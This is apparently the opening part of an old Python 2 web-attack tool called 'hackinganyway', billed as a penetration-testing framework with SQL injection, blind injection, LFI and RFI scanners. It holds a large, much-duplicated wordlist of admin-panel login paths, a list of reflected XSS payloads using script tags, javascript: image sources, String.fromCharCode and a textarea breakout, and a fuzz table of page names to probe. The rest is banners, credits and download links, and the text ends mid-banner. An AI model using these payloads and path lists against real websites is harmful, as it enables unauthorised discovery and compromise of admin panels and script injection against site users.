#!/usr/bin/python
#Copyright (C) <2008>  <Ashikali hasan>
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
#print "########################################################"
#print "#       _______         _______       .___             #" 
#print "#       \   _  \   ____ \   _  \    __| _/____         #" 
#print "#       /  /_\  \ / ___\/  /_\  \  / __ |/ __ \        #" 
#print "#       \  \_/   \ <\___\  \_/   \/ /_/ \  ___/        #" 
#print "#       \_____   /\_____>\_____  /\_____|\____\        #" 
#print "#              \/              \/                      #" 
#print "#              ___________   ______  _  __             #" 
#print "#            _/ ___\_  __ \_/ __ \ \/ \/ /             #" 
#print "#            \  \___|  | \/\  ___/\     /              #" 
#print "#             \___  >__|    \___  >\/\_/               #" 
#print "#      est.2008   \/            \/   www.0c0de.com     #" 
#print "########################################################" 

from time import *
import socket,os,sys
import time, re, datetime,httplib,urllib2
a = 'None' 
b = 'None' 
c = 'None' 
d = 'None' 
e = 'None' 
f = 'None' 
g = 'None' 
h = 'None' 
i = 'None' 
j = 'None' 
k = 'None'
alert= "ashikali%2D1208%2DY0U"
jense = '0'
myip = 0
an = 0
pls = 0
anony = 0
bol = 0
bikimiki = '0'
ashikali1208 = '0'
jamrukh='0'
dadam='0'
hacking="hackinganywaylog.txt"
salmanali = '0'
wol = ['forum/ucp.php?mode=login','ucp.php?mode=login','blog/wp-login.php','wp-login.php','admin.php','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php','joomla/administrator','login.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.php','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.php','admin_area/index.php','admin/controlpanel.php','admincp/index.php','admincp/login.php','admincp/index.php','admin/account.php','adminpanel.php','webadmin.php','webadmin/index.php','webadmin/admin.php','webadmin/login.php','admin/admin_login.php','admin_login.php','panel-administracion/login.php','admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php','administrator.php','admin_area/admin.php','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php','controlpanel.php','admincontrol.php',
'admin/adminLogin.php','adminLogin.php','admin/adminLogin.php','home.php','rcjakar/admin/login.php','adminarea/index.php','adminarea/admin.php','webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.php','admin.php','admin/cp.php','cp.php','adminpanel.php','moderator.php','administrator/index.php','administrator/login.php','user.php','administrator/account.php','administrator.php','login.php','modelsearch/login.php','moderator/login.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php','adm/index.php','adm.php','moderator/admin.php','user.php','account.php','controlpanel.php','admincontrol.php','panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','forum/ucp.html?mode=login','ucp.html?mode=login','blog/wp-login.html','wp-login.html','admin.html','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admin/account.html','joomla/administrator','login.html',
'admin_area/admin.html','admin_area/login.html','siteadmin/login.html','siteadmin/index.html','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admin_area/index.html','bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin_area/login.html','admin_area/index.html','admin/controlpanel.html','admincp/index.html','admincp/login.html','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html','webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html','admin/cp.html','cp.html','administrator/index.html','administrator/login.html','nsw/admin/login.html','webadmin/login.html','admin/admin_login.html','admin_login.html','administrator/account.html','administrator.html','admin_area/admin.html','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','modelsearch/login.html','moderator.html','moderator/login.html','moderator/admin.html','account.html','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.html','admincontrol.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.html','adminarea/index.html','adminarea/admin.html','webadmin.html','webadmin/index.html','webadmin/admin.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.html','moderator.html','administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.html','account.html','controlpanel.html','admincontrol.html','panel-administracion/login.html','wp-login.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html','adm/admloginuser.html','admloginuser.html','admin2.html','admin2/login.html','admin2/index.html','adm/index.html','adm.html','affiliate.html','adm_auth.html','memberadmin.html','administratorlogin.html','forum/ucp.asp?mode=login','ucp.asp?mode=login','blog/wp-login.asp','wp-login.asp','admin.asp','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','admin/account.asp','joomla/administrator','login.asp',
'admin_area/admin.asp','admin_area/login.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp','admin/home.asp','admin_area/login.asp','admin_area/index.asp','admin/controlpanel.asp','admincp/index.asp','admincp/login.asp','admincp/index.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp','webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','admin/cp.asp','cp.asp','administrator/index.asp','administrator/login.asp','nsw/admin/login.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','administrator/account.asp','administrator.asp','admin_area/admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp','admin/home.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','moderator/admin.asp','account.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','controlpanel.asp','admincontrol.asp',
'admin/adminLogin.asp','adminLogin.asp','admin/adminLogin.asp','home.asp','rcjakar/admin/login.asp','adminarea/index.asp','adminarea/admin.asp','webadmin.asp','webadmin/index.asp','webadmin/admin.asp','admin/controlpanel.asp','admin.asp','admin/cp.asp','cp.asp','adminpanel.asp','moderator.asp','administrator/index.asp','administrator/login.asp','user.asp','administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator/login.asp','adminarea/login.asp','panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','admincontrol/login.asp','adm/index.asp','adm.asp','moderator/admin.asp','user.asp','account.asp','controlpanel.asp','admincontrol.asp','panel-administracion/login.asp','wp-login.asp','adminLogin.asp','admin/adminLogin.asp','home.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp','adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','forum/ucp.aspx?mode=login','ucp.aspx?mode=login','blog/wp-login.aspx','wp-login.aspx','admin.aspx','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx','joomla/administrator','login.aspx',
'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.aspx','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.aspx','admin_area/index.aspx','admin/controlpanel.aspx','admincp/index.aspx','admincp/login.aspx','admincp/index.aspx','admin/account.aspx','adminpanel.aspx','webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx','panel-administracion/login.aspx','admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx','administrator/account.aspx','administrator.aspx','admin_area/admin.aspx','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx','moderator/admin.aspx','account.aspx','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx','controlpanel.aspx','admincontrol.aspx',
'admin/adminLogin.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','rcjakar/admin/login.aspx','adminarea/index.aspx','adminarea/admin.aspx','webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.aspx','admin.aspx','admin/cp.aspx','cp.aspx','adminpanel.aspx','moderator.aspx','administrator/index.aspx','administrator/login.aspx','user.aspx','administrator/account.aspx','administrator.aspx','login.aspx','modelsearch/login.aspx','moderator/login.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx','modelsearch/admin.aspx','admincontrol/login.aspx','adm/index.aspx','adm.aspx','moderator/admin.aspx','user.aspx','account.aspx','controlpanel.aspx','admincontrol.aspx','panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','adminarea/index.aspx','adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx','modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx','forum/ucp.jsp?mode=login','ucp.jsp?mode=login','blog/wp-login.jsp','wp-login.jsp','admin.jsp','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.jsp','admin/index.jsp','admin/login.jsp','admin/admin.jsp','admin/account.jsp','joomla/administrator','login.jsp',
'admin_area/admin.jsp','admin_area/login.jsp','siteadmin/login.jsp','siteadmin/index.jsp','siteadmin/login.jsp','admin/account.jsp','admin/index.jsp','admin/login.jsp','admin/admin.jsp','admin_area/index.jsp','bb-admin/index.jsp','bb-admin/login.jsp','bb-admin/admin.jsp','admin/home.jsp','admin_area/login.jsp','admin_area/index.jsp','admin/controlpanel.jsp','admincp/index.jsp','admincp/login.jsp','admincp/index.jsp','admin/account.jsp','adminpanel.jsp','webadmin.jsp','webadmin/index.jsp','webadmin/admin.jsp','webadmin/login.jsp','admin/admin_login.jsp','admin_login.jsp','panel-administracion/login.jsp','admin/cp.jsp','cp.jsp','administrator/index.jsp','administrator/login.jsp','nsw/admin/login.jsp','webadmin/login.jsp','admin/admin_login.jsp','admin_login.jsp','administrator/account.jsp','administrator.jsp','admin_area/admin.jsp','pages/admin/admin-login.jsp','admin/admin-login.jsp','admin-login.jsp','bb-admin/index.jsp','bb-admin/login.jsp','bb-admin/admin.jsp','admin/home.jsp','modelsearch/login.jsp','moderator.jsp','moderator/login.jsp','moderator/admin.jsp','account.jsp','pages/admin/admin-login.jsp','admin/admin-login.jsp','admin-login.jsp','controlpanel.jsp','admincontrol.jsp',
'admin/adminLogin.jsp','adminLogin.jsp','admin/adminLogin.jsp','home.jsp','rcjakar/admin/login.jsp','adminarea/index.jsp','adminarea/admin.jsp','webadmin.jsp','webadmin/index.jsp','webadmin/admin.jsp','admin/controlpanel.jsp','admin.jsp','admin/cp.jsp','cp.jsp','adminpanel.jsp','moderator.jsp','administrator/index.jsp','administrator/login.jsp','user.jsp','administrator/account.jsp','administrator.jsp','login.jsp','modelsearch/login.jsp','moderator/login.jsp','adminarea/login.jsp','panel-administracion/index.jsp','panel-administracion/admin.jsp','modelsearch/index.jsp','modelsearch/admin.jsp','admincontrol/login.jsp','adm/index.jsp','adm.jsp','moderator/admin.jsp','user.jsp','account.jsp','controlpanel.jsp','admincontrol.jsp','panel-administracion/login.jsp','wp-login.jsp','adminLogin.jsp','admin/adminLogin.jsp','home.jsp','adminarea/index.jsp','adminarea/admin.jsp','adminarea/login.jsp','panel-administracion/index.jsp','panel-administracion/admin.jsp','modelsearch/index.jsp','modelsearch/admin.jsp','admincontrol/login.jsp','adm/admloginuser.jsp','admloginuser.jsp','admin2.jsp','admin2/login.jsp','admin2/index.jsp','adm/index.jsp','adm.jsp','affiliate.jsp','adm_auth.jsp','memberadmin.jsp','administratorlogin.jsp'
,'forum/ucp.cfm?mode=login','ucp.cfm?mode=login','blog/wp-login.cfm','wp-login.cfm','admin.cfm','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm','joomla/administrator','login.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.cfm','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.cfm','admin_area/index.cfm','admin/controlpanel.cfm','admincp/index.cfm','admincp/login.cfm','admincp/index.cfm','admin/account.cfm','adminpanel.cfm','webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm','panel-administracion/login.cfm','admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm','administrator/account.cfm','administrator.cfm','admin_area/admin.cfm','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm','moderator/admin.cfm','account.cfm','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm','controlpanel.cfm','admincontrol.cfm',
'admin/adminLogin.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','rcjakar/admin/login.cfm','adminarea/index.cfm','adminarea/admin.cfm','webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.cfm','admin.cfm','admin/cp.cfm','cp.cfm','adminpanel.cfm','moderator.cfm','administrator/index.cfm','administrator/login.cfm','user.cfm','administrator/account.cfm','administrator.cfm','login.cfm','modelsearch/login.cfm','moderator/login.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm','modelsearch/admin.cfm','admincontrol/login.cfm','adm/index.cfm','adm.cfm','moderator/admin.cfm','user.cfm','account.cfm','controlpanel.cfm','admincontrol.cfm','panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','adminarea/index.cfm','adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm','modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm']


xss_payloads = ["%22%3E%3Cscript%3Ealert%28%27"+alert+"%27%29%3C%2Fscript%3E",
		"%22%3E<IMG SRC=\"javascript:alert(%27"+alert+"%27);\">",
		"%22%3E<script>alert(String.fromCharCode(68,51,72,89,68,82,56,45,48,119,78,122,45,89,48,85));</script>",
		"'';!--\"<%27"+alert+"%27>=&{()}",
		"';alert(0)//\';alert(1)//%22;alert(2)//\%22;alert(3)//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(%27"+alert+"%27)%3C/SCRIPT%3E=&{}%22);}alert(6);function",
		"</textarea><script>alert(%27"+alert+"%27)</script>"]


fuzztable = ['index', 'Index', 'About', 'view', 'access', 'account', 'act_hit', 'activate', 'adclick', 
	     'add_channel', 'addfeed', 'addtestimonial', 'adentry', 'ad_link', 'admin', 'admin_upload', 'adn_count', 
	     'adverclick', 'affi', 'afgb', 'afi', 'agt', 'album', 'albums', 'animation', 'annonces-add', 'announce_detail', 
	     'announcement_content', 'apply', 'apricot', 'ARead', 'art', 'art_desc', 'article', 'article2', 'article_detail_parse', 
	     'ArticleInfo', 'article_read', 'Article_Show', 'article_show_full', 'article_view', 'ArticleView', 'author', 
	     'author_album', 'author_price', 'base', 'basket', 'batch', 'bbs', 'bbs_detail', 'bencandy', 'billboard01', 'b_link', 
	     'blog', 'blogdetails', 'blog-entry', 'bloggermeet', 'blog_groups', 'blogind', 'blog_show', 'blog_story', 'board', 
	     'board1', 'board_detail', 'book', 'bookmark', 'Books', 'browse', 'browse_image', 'BusinessReport', 
	     'button', 'camp_detail', 'candidatedetails', 'cardshow', 'catalog', 'categories', 'category', 'cfidata', 'channel', 
	     'Checkout', 'checkout_shipping', 'clanek_ukaz', 'clap', 'class_04', 'click', 'clickin', 'clickprod', 'CollectionList', 
	     'collegeprice', 'columns', 'comeoncool', 'comment', 'comments', 'Community', 'company', 'company_search', 'contact', 
	     'content', 'Content', 'content_new', 'contestant', 'control', 'coolfreelist', 'countblogstar', 'counter', 
	     'examine_list', 'external', 'ExtLink', 'faculty_profile', 'fair_homepage', 'faq', 'features_show2a', 'file', 'files', 
	     'films', 'form', 'formular', 'forum', 'forumdisplay', 'forumhome', 'forummessage', 'forum_messageDetail', 'forum_posts', 
	     'forum_sub_posts', 'frame', 'fullstory', 'gbook', 'get', 'getInPageTarget', 'GetRelease', 
	     'gocity', 'goodh', 'goods_comment', 'goout', 'goto', 'goto_freetel', 'gp_nl', 'graduate', 'group_page', 'group_topic', 
	     'guest', 'guestbook', 'guestbook_new', 'GuestMagBN', 'heihei', 'help', 'hitlink', 'home', 'hrbclick', 'iboard', 
	     'idevaffiliate', 'iframe', 'Image', 'img', 'include', 'index1', 'index2', 'index4', 'index_fo', 
	     'indexmain', 'indexnew', 'index_u', 'Individual', 'info', 'infoadd', 'infopage', 'infoshow2', 'insert_post', 
             'institutiondetail', 'international', 'into', 'invitation', 'inviteshow', 'isomil_valentine2_detail', 'item', 
	     'item_detail', 'item_groups', 'j140s', 'Job', '_jobposting', 'jobs', 'join', 
	     'newsmain', 'news_show', 'news_view', 'newthread', 'noscript', 'noticedet', 'notify', 'ocean-tracking', 'ocitview', 
	     'offices-ser_news', 'OpenAd', 'optionmmi', 'original_index', 'out', 'page', 'pages', 
	     'page-sanmin2', 'pageShw', 'parking', 'partydetails', 'permalink', 'PersonalSpace', 'plan', 'play', 'Play', 'player', 
	     'pleasure', 'plugin', 'plugins', 'point', 'poll', 'pollbooth', 
	     'pollsshow', 'post', 'postcard', 'posting', 'price', 'PriceList', 'print',
	     'pro_def', 'product', 'product_detail', 'ProductDetails', 'product_info', 'products', 'profile', 
             'profilesdetail', 'programimglist', 'projectdetails', 'projects', 'providepassword', 'psview', 
	     'publicrelationView', 'publisher_titles', 'pub-stats', 'qk_qklx', 'qoblog', 'quickadd', 'quotations', 'rank', 'ranking', 
	     'ranklink', 'read', 'readarticle', 'ReadNews', 'read_user', 'recruit', 'redir', 'redirect', 
	     'regdom', 'regist', 'register', 'report_get', 'req', 'RequestQuote', 'Results', 'ribbon_link', 'rin', 'rsd', 'rss', 
	     'rssFeed_it', 'rwcomments', 'sch', 'schedule', 'scielo', 'search', 'Search', 'search2', 
	     'search_form', 'searchpicsnap', 'searchresults', 'selectintro', 'select_tokucho', 'sendemail', 'sendmessage', 'serve', 
	     'shop', 'shop_fair', 'shopper_new', 'shopping_cart', 'show', 'ShowArtiChannel', 'showarticle', 
	     'showblog', 'showcard', 'showclass', 'showhistory', 'show_miniworld', 'shownews', 'showNews', 'ShowNewsDetail', 
	     'show_oc', 'showpage', 'show_photo', 'showpkn', 'showpost', 'showprofile', 'showquestion', 'showsp', 'showstats', 
	     'showthread', 'showtrackback', 'show_want', 'signup', 'single', 'site', 'sitecome', 'smsmain', 
	     'snapshots', 'soft_detail', 'sondages', 'sort', 'source', 'space', 'spacecp', 'special', 'specials', 
	     'spip', 'spurl', 'start', 'stat', 'statistics', 'statistik', 'stats', 'sub', 'subcate_list', 'subforum', 
	     'submit', 'subscribe', 'subscription', 'support', 'survey', 'tags', 'takeinfo_more', 'tana', 'task', 'tbh_sub', 
	     'tblogread', 'tchinfo', 'teacher', 'tech_details', 'tenders', 'terms', 'T_examinat', 'thread', 'thumbnails', 'tier', 
	     'top', 'topic', 'topicdetail', 'topics', 'topsites', 'tradeinfo', 'training', 'transfer', 'trip_detail',
	     'trpSupport', 'tr_set', 'tryout_item', 'two', 'type', 'Type', 'ucp', 'user', 
	     'User', 'userblog', 'userinfo', 'user_profile', 'user_register', 'usersettings', 
	     'user_view', 'vanessa_video', 'vbimghost', 'video', 'videoByTag', 'videos', 'View', 'viewad', 
	     'viewall', 'view_all_gallery', 'view_clip', 'viewdoc', 'viewEvent', 'viewfaculty', 
	     'viewforum', 'viewinfo', 'view_inside', 'ViewItem', 'viewmessage', 'viewnews', 'view_news', 'ViewNews', 'viewphotos', 
	     'viewpro', 'viewscat', 'viewstory', 'viewthread', 'viewtop', 'viewtopic', 'viewuser', 'view_video', 'viewwz', 
	     'VIP_showLawyer_article', 'visit', 'vote', 'votealbum', 'voteArticle', 'wall', 'webarticle', 'webarticle2', 'webboard', 
	     'webcounter', 'websearch', 'weekend_news_detail', 'welcome', 'wenji', 'whoischeck', 'worldwide', 'wp-login', 
	     'wp-profile1', 'xiti', 'zoom']

def downres():

	print "\t\t\t Wellcome To Download Section"
	print "\t\t\t-------------------------------"
	print "\t\t You Can Download This Tools From Folowing Source "
	print "\n\t[+] SOURCE = http://www.ashikali.com/tools/hackinganyway.py"
	print "\t[+] SOURCE = http://www.0c0de.com/tools/other/hackinganyway.py"
	print "\t[+] SOURCE = http://www.darkc0de.com/other/hackinganyway.py"
	print "\t[+] COMPILED BINARY = http://www.ashikali.com/tools/hackinganyway.rar"
	print "\t[+] COMPILED BINARY = http://www.0c0de.com/tools/other/hackinganyway.rar"
	xca = raw_input("\n\n\tPress Any Key To Conteneue... ")
def speth():
	print "\n\t\t\t           DEDICATES"
	print "\t\t\t--------------------------------"
	print "\tI Dedicate This Tool To My Missing & Invisible Friend & Great Respected Person Mr_wisdom & My Best Friend And Great Socket Programmar zerocode, pinuter,zodiak & grayhat. I Also Uniquely Dedicate This Tool To My Friend Jayashankar & mr_wisdom == arumajidono"
	print "\n\t\t\t            THANAKS"
	print "\t\t\t--------------------------------"
	print "\tI First And Formost Would Like To Say Thanks Greatest Comunity Ever 0c0de & darkcode. Hey... Long... Live... 0c0de & darkcode & i Specialy Say Thanks To d3hydr8, beenu,rsauron, inkubas , baltajar, low1z & All The darkcode Crew. I Also Would like to Say Thanks To Security-shell Crew Pentest, sp1r1t, Watchdog, Zer0Flag, redking & s3th (Hey Guys Miss You All) And i Also Say Thanks My New Chating Friend Ali.mani & Zombie_ksa"
	print "\n\t\t\t            CONTACT"
	print "\t\t\t--------------------------------"
	print "\t\t    E-MAIL :- ashikali1208[at]yahoo[dot]com"
	print "\t\t    Main Website:- www.ashikali.com"
	print "\t\t    Secondary website:- www.0c0de.com"
	xca = raw_input("\n\n\tPress Any Key To Conteneue... ")
	

def creditp():

	print "\t                 Wellcome To Credit Section  "
	print "\t************************************************************"
	print "\n\tThis Tool Made By Help Of Many Etremly Inteligent Socket Programars And Great Hackers Ideas And Programs. I Would Like To Give Credit Of Tool To Following People"
	print "\t  NAME                     EMAIL                      WEBSITE"
	print "\t ------                   -------                   -----------"
	print "\tzerocode88      zerocode88[at]yahoo[dot]com        0c0de.com"
	print "\td3hydr8         d3hydr8[at]gmail[dot]com          darkc0de.com"
	print "\trsauron         rsauron[at]gmail[dot]com               -"
	print "\tmywisdom        mywisdom@jasakom.org                   -"
	print "\td3ck4           hacking.expose@gmail.com    hackingexpose.blogspot.com"
	print "\tP47r1ck         p47r1ckro@gmail.com                    -"
	print "\tbeenu           beenudel1986@yahoo.com                 -"
	print "\tgodwinaustin20  godwinaustin20@gmail.com        www.beenuarora.com"
	print "\tjonathan59                 -                           -"
	print "\tlow1z                      -                    low1z.mybrute.com"
	print "\tinkubus         inkubus[at]darkc0de[dot]com            -"
	print "\tgblack                     -                           -"
	print "\tbaltazar                   -                           -"
	print "\tgrayhat1208     grayhat1208[at]gmail[dot]com           -"
	print "\tpinuter         pinuter[at]gmail[dot]com           0c0de.com"
	print "\tZodiak          pinuter[at]gmail[dot]com           0c0de.com"

	bo=raw_input("\t\tPress Any Key To Conteneue...")


def banalls():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    All SCAN                                   #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"


def bansql():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    SQL INJECTION SCANNAR                      #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"
	
def banbli():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    BLIND INJECTION SCANNAR                    #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"

def banlfi():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    LOCAL FILE Inclusion SCANNAR               #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"

def banrfi():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    REMOTE FILE INCLUSION SCANNAR              #" 
